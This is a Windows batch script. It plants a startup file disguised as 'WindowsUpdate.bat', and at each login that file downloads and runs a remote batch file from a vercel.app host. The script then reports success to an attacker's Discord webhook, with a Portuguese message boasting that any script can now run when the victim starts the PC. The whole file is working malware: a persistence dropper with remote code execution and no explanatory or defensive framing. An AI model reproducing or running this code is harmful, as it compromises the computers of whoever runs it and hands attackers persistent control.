@echo off
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

(
echo @echo off
echo powershell -c "iwr 'https://lzx-one.vercel.app/LXZ.bat' -OutFile $env:TEMP\t.bat; & $env:TEMP\t.bat"
) > "%startup%\WindowsUpdate.bat"


set MESSAGE=Copiador executado com sucesso, voce tem direito de colocar qualquer script quando esse usuario iniciar o pc para ser executado

:: Envia pro Discord
curl -s ^
-H "Content-Type: application/json" ^
-X POST ^
-d "{\"content\":\"%MESSAGE%\"}" ^
https://discord.com/api/webhooks/1476889854296981637/-KRgTWFBVNLoiII8EPfnGZDivUtmerZR7Zr-NAhDJ3BkERuuXPW818ug_I-o5xak71OK

endlocal
exit
